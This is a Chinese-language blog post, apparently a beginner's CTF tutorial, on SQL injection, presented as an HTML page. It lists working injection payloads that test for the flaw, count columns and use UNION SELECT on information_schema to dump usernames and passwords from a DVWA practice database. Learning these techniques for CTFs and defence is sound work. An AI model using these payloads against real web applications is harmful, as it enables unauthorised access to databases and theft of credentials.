@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="LaLa" />
+
+
+
+<meta name="description" content="—从零开始的笔记—">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB-CTF中的SQL注入">
+<meta property="og:url" content="http://lalajun.com/2017/08/29/WEB-CTF中的SQL注入/index.html">
+<meta property="og:site_name" content="啦啦菌NODE">
+<meta property="og:description" content="—从零开始的笔记—">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2017-09-25T13:10:56.647Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WEB-CTF中的SQL注入">
+<meta name="twitter:description" content="—从零开始的笔记—">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="啦啦菌NODE" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>WEB-CTF中的SQL注入 | 啦啦菌NODE</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">LaLa</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="/827177488@qq.com" title="Email"></a>
+                            
+                                <a class="fa bilibili" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
+                            
+                                <a class="fa QQ" href="/827177488" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://betamaois.github.io">betamao</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://err0rzz.github.io">壮壮</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://esebanana.github.io">ESE</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hhddj.github.io/">hhd</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://blog.0kami.cn/">0kami</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://e-lias.com/">Max</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.leavesongs.com/">leavesong</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://iamstudy.cnblogs.com/">l3m0n</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://myblackmanba.github.io/">MyBlackManba</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">biubiubiubiu～&lt;br&gt;动感光波！&lt;br&gt;&lt;br&gt;晚安～</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LaLa</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">LaLa</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="/827177488@qq.com" title="Email"></a>
+                            
+                                <a class="fa bilibili" target="_blank" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/827177488" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-WEB-CTF中的SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/08/29/WEB-CTF中的SQL注入/" class="article-date">
+      <time datetime="2017-08-28T21:16:14.000Z" itemprop="datePublished">2017-08-29</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      WEB-CTF中的SQL注入
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>—从零开始的笔记—</p>
+<a id="more"></a>
+<p>从最最基础的开始=.= start</p>
+<h2 id="SQL注入的基本原理"><a href="#SQL注入的基本原理" class="headerlink" title="SQL注入的基本原理"></a>SQL注入的基本原理</h2><p>  你提交的<strong>任何内容</strong>都会被服务器放入sql语句中执行,于是可以构筑自己的sql语句在服务器端执行。<br>  当然以上所说的是在服务器完全没有防御的情况下，通常都不会这么简单，但是原理是相同。</p>
+<h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><ul>
+<li>根据注入点(既我们提交内容的位置)情况的不同分为两种：<ul>
+<li>字符型注入: 提交的内容<strong>会</strong>在服务端处左右会被加上’‘</li>
+<li>数字型注入: 提交的内容<strong>不会</strong>在服务端处加上’‘<br>以上两种注入的区别在于：字符型注入需要用各种方法闭合单引号,屏蔽单引号等，而数字型注入不用，即数字型相对简单。</li>
+</ul>
+</li>
+<li>根据对于注入结果服务端会显示给攻击者与否分两种：<ul>
+<li>有回显的sql注入：有显示查询结果或错误信息</li>
+<li>sql盲注：没有显示直接结果或错误。但仍然由办法提取信息，sql盲注较为复杂又分为<strong>布尔型盲注</strong>和<strong>时间型盲注入</strong><ul>
+<li>布尔型盲注：返回状态只有两种情况，通常为有显示true和无显示false，借此来判断是否成功。</li>
+<li>时间型盲注：返回状态没有任何区别，若成功人为制造延迟时间延迟，以此来判断是否成功。<br>此篇会详细介绍有回显的sql注入，sql盲注另开一篇</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="简单的了解数据库的结构"><a href="#简单的了解数据库的结构" class="headerlink" title="简单的了解数据库的结构"></a>简单的了解数据库的结构</h2><p>  数据库 &gt; 表 &gt; 列<br>  数据库中的库名，表名，列名等基本信息会存储在information_schema这个数据库中tables，columns的表内。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">%</th>
+<th style="text-align:center">数据库</th>
+<th style="text-align:center">表</th>
+<th style="text-align:center">列 </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">  英文</td>
+<td style="text-align:center">schema</td>
+<td style="text-align:center">table</td>
+<td style="text-align:center">column</td>
+</tr>
+<tr>
+<td style="text-align:center">  信息库中的列名</td>
+<td style="text-align:center">table_schema</td>
+<td style="text-align:center">table_name</td>
+<td style="text-align:center">column_name</td>
+</tr>
+</tbody>
+</table>
+<h2 id="字符型SQL注入的步骤"><a href="#字符型SQL注入的步骤" class="headerlink" title="字符型SQL注入的步骤"></a>字符型SQL注入的步骤</h2><p>  首先sql注入的<strong>核心</strong>就是去探测收集服务器的信息，再<strong>推测判断服务器sql语句</strong>的构成，再加以利用得到自己想要的数据即FLAG。<br>  以下以<strong>最基础的字符型注入</strong>为例，为了方便理解，服务端的sql语句以下为例<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select 列 from 数据库.表 <span class="built_in">where</span> name=<span class="string">'$name'</span></div></pre></td></tr></table></figure></p>
+<h3 id="1-判断是否有SQL注入点"><a href="#1-判断是否有SQL注入点" class="headerlink" title="1.判断是否有SQL注入点"></a>1.判断是否有SQL注入点</h3><p>判断sql注入点：服务器会对我们除了正常输入以外的测试语句有反应</p>
+<ul>
+<li>报错</li>
+<li>可以影响到查询结果</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>1    (前后闭合’‘，此处应该返回正确的页面，即与<span class="variable">$name</span>=1一样)</div><div class="line"></div><div class="line"><span class="variable">$name</span>= 1<span class="string">' and '</span>1<span class="string">' = '</span>2    (前后闭合’‘, 此处应该返回数据库错误的信息，即与<span class="variable">$name</span>=1不同)</div><div class="line"></div><div class="line">全句：select 列 from 表 <span class="built_in">where</span> name = <span class="string">'1'</span> and <span class="string">'1'</span>=<span class="string">'1'</span></div></pre></td></tr></table></figure>
+<p>在确认有注入漏洞之后，探测sql语句组成</p>
+<h3 id="2-判断select语句中有几列"><a href="#2-判断select语句中有几列" class="headerlink" title="2.判断select语句中有几列"></a>2.判断select语句中有几列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$name</span>=1<span class="string">' order by 数字n --+  （--+ 为url编码后的 --(空格) 是注释符，用于屏蔽后面的‘）</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全句：select 列 from 表 where name = '</span><span class="string">' order by 数字n -- ’</span></div></pre></td></tr></table></figure>
+<blockquote>
+<p><a href="http://www.w3school.com.cn/sql/sql_orderby.asp" target="_blank" rel="external">order by</a> 列名  （列名可以为select语句中列的序号,name,age——-&gt;1,2）</p>
+</blockquote>
+<p>因此数字从大往小猜，如果超出它的列数，则报错；如果恰好等于列数，显示$name=1的结果<br>假设结果 n=2 列</p>
+<h3 id="3-判断显示的信息是第几列的信息"><a href="#3-判断显示的信息是第几列的信息" class="headerlink" title="3.判断显示的信息是第几列的信息"></a>3.判断显示的信息是第几列的信息</h3><p>一般在我们可见页面中显示的信息不一定是查询全部列数，可能查询3列，显示1列。<br>通过‘直接闭合前面的select语句，使其前半句查询结果空(除非存在name=’‘的情况)<br>union select 1,2 通过显示的数字来确定显示的列的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$name=&apos; union select 1,2 --+</div><div class="line"></div><div class="line">全句：select n列 from 表 where name = &apos;&apos; union select 1,2 -- &apos;</div></pre></td></tr></table></figure></p>
+<p>假设得到 2 ，以后想要查询的信息就放在第二个列处</p>
+<h3 id="4-利用函数来收集信息"><a href="#4-利用函数来收集信息" class="headerlink" title="4.利用函数来收集信息"></a>4.利用函数来收集信息</h3><p>查询sql自带的函数来确定当前用户，当前数据库等信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">用户：user()</div><div class="line">当前数据库：database()</div><div class="line">数据库版本：version()</div><div class="line">@@hostname （用户）</div><div class="line">@@datadir   (数据库在文件的位置)</div><div class="line">@@version  （版本)</div><div class="line">@@version_compile_OS  (操作系统版本)</div><div class="line"></div><div class="line"><span class="variable">$name</span>=<span class="string">' union select 1,user() --+</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">全局：select 2列 from 表 where name = '</span><span class="string">' union select 1,user() -- '</span></div></pre></td></tr></table></figure></p>
+<p>如果为root用户，就可以访问information_schema数据库</p>
+<h3 id="5-通过-union-查询数据库"><a href="#5-通过-union-查询数据库" class="headerlink" title="5.通过 union 查询数据库"></a>5.通过 union 查询数据库</h3><p>  通过<strong>information_schema数据库</strong>中的tables，columns来查询目标的数据库，表，列<br>  再直接查询内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">查询数据库</div><div class="line">$name=&apos; union select 1,table_schema from information_schema.tables --+</div><div class="line"></div><div class="line">查询数据库中有多少个表</div><div class="line">$name=&apos; union select table_schema,count(*) from information_schema.tables --+</div><div class="line"></div><div class="line">查询指定数据库中的表名</div><div class="line">$name=&apos; union select 1,table_name from information_schema.tables where table_schema=&apos;dvwa&apos; --+</div><div class="line"></div><div class="line">查询指定数据库指定表中的列名</div><div class="line">$name=&apos; union select table_name,column_name from information_schema.columns where table_schema=&apos;dvwa&apos; and table_name=&apos;users&apos;--+</div><div class="line"></div><div class="line">查询指定数据库指定表的列的内容</div><div class="line">$name=&apos; union select user,password from dvwa.users --+</div><div class="line"></div><div class="line">查询链接显示</div><div class="line">$name=&apos; union select null,concat_ws(&apos; : &apos;,user,password) from dvwa.users --(空格)</div><div class="line">$name=&apos; union select null,concat(user,&apos; : &apos;,password) from dvwa.users --(空格)</div><div class="line">ps. &apos;:&apos; 编码---&gt; 0x3a</div></pre></td></tr></table></figure></p>
+<h3 id="6-无权限时，猜解列名，表名，库名"><a href="#6-无权限时，猜解列名，表名，库名" class="headerlink" title="6.无权限时，猜解列名，表名，库名"></a>6.无权限时，猜解列名，表名，库名</h3><p>  当前用户不是root用户，就无权访问information_schema库<br>  只能通过返回页面的两种状态判断是否猜解正确，其原理跟布尔型sql盲注一致<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.猜解当前表中的列名</div><div class="line">$name=&apos; and column is null --+    </div><div class="line"></div><div class="line">全句：select 2列 from 表 where name = &apos;&apos; and column is null -- &apos;</div></pre></td></tr></table></figure></p>
+<p>用字典文件替换column，如果不存在此列，有错误；存在此列，无返回(类似来判断，下同)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">2.猜解当前表名------已猜出列名</div><div class="line">$name=&apos; and table.user is null --+	</div><div class="line"></div><div class="line">3.猜解当前数据库名--已猜出列名，表名</div><div class="line">$name=&apos; and db.table.user is null --+</div><div class="line"></div><div class="line">4.猜解当前数据库的其他表</div><div class="line">$name=&apos; and (select count(*) from table)&gt;0 --+ （不能猜解其他数据库的库名，在前面自动添加了库名；count(*):所有查询结果的数量）</div></pre></td></tr></table></figure></p>
+<p>在猜解到你所要的库，表，列之后可以直接union select 查询</p>
+<h2 id="数字型SQL注入"><a href="#数字型SQL注入" class="headerlink" title="数字型SQL注入"></a>数字型SQL注入</h2><p>数字型注入和字符型注入原理相同，但更为简单。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$name=1 and 1=1 #</div></pre></td></tr></table></figure></p>
+<p>区别：</p>
+<ul>
+<li>不用考虑 ’ 闭合问题</li>
+<li>输入字符’a’时  把需要的字符串变为Ox16进制 </li>
+</ul>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上就可以通过sql注入漏洞，查询到数据库的信息。<br>另外，还可以通过数据库进行—-&gt;sql文件操作漏洞<br>但是实际情况下：<br>服务器会过滤限制我们的输入，这就关系到—-&gt;sql过滤<br>服务器不显示查询信息和错误信息，需要—-&gt;sql盲注</p>
+<h2 id="数据库函数"><a href="#数据库函数" class="headerlink" title="数据库函数"></a>数据库函数</h2><ul>
+<li>char（）—-&gt; ASCII码 变为 字符</li>
+<li><a href="http://www.bubuko.com/infodetail-455153.html" target="_blank" rel="external">group_cat（) 和 group_concat</a> —–&gt; 用分隔符链接字符串；可以多个结果合并提高效率</li>
+<li><a href="http://www.yiibai.com/sql/sql_function_substring_index.html" target="_blank" rel="external">substring_index()</a>  —–&gt; 分割字符串提取自己想要查看的</li>
+<li><a href="http://www.w3school.com.cn/sql/sql_func_mid.asp" target="_blank" rel="external">mid(String,n,n)</a>——&gt;截取字符串</li>
+<li><a href="https://www.lvtao.net/study_doc/mysql/mysql_function_oct_str.html" target="_blank" rel="external">ord()</a> ——-&gt;字符变为ASCII码， 一个字节字符直接变ASCII，多字节字符相连ASCII<br>ord() <strong>&amp;</strong> 128 或 64 或 32 或 16 或 8 ……1 来判断分割多个字符</li>
+<li>and 前面语句<strong>出错</strong>后面语句不执行   </li>
+<li>or  前面语句<strong>正确</strong>后面语句部执行</li>
+</ul>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">LaLa</a></p>
+        <p><span>发布时间:</span>2017-08-29, 05:16:14</p>
+        <p><span>最后更新:</span>2017-09-25, 21:10:56</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/08/29/WEB-CTF中的SQL注入/" title="WEB-CTF中的SQL注入">http://lalajun.com/2017/08/29/WEB-CTF中的SQL注入/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://lalajun.com/2017/08/29/WEB-CTF中的SQL注入/　　作者: LaLa" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2017/09/18/ZJGSCTF_writeup/">
+                    ZJGSCTF_writeup
+                </a>
+            </div>
+        
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入的基本原理"><span class="toc-text">SQL注入的基本原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入的分类"><span class="toc-text">SQL注入的分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#简单的了解数据库的结构"><span class="toc-text">简单的了解数据库的结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#字符型SQL注入的步骤"><span class="toc-text">字符型SQL注入的步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-判断是否有SQL注入点"><span class="toc-text">1.判断是否有SQL注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-判断select语句中有几列"><span class="toc-text">2.判断select语句中有几列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-判断显示的信息是第几列的信息"><span class="toc-text">3.判断显示的信息是第几列的信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-利用函数来收集信息"><span class="toc-text">4.利用函数来收集信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-通过-union-查询数据库"><span class="toc-text">5.通过 union 查询数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-无权限时，猜解列名，表名，库名"><span class="toc-text">6.无权限时，猜解列名，表名，库名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数字型SQL注入"><span class="toc-text">数字型SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-text">小结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数据库函数"><span class="toc-text">数据库函数</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/09/18/ZJGSCTF_writeup/" title="上一篇: ZJGSCTF_writeup">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/WEB-CTF中的sql盲注/">WEB-CTF中的sql盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/ZJGSCTF_writeup/">ZJGSCTF_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/29/WEB-CTF中的SQL注入/">WEB-CTF中的SQL注入</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017 LaLa
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+             post: ".article-entry a[href], .copyright a[href]", 
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
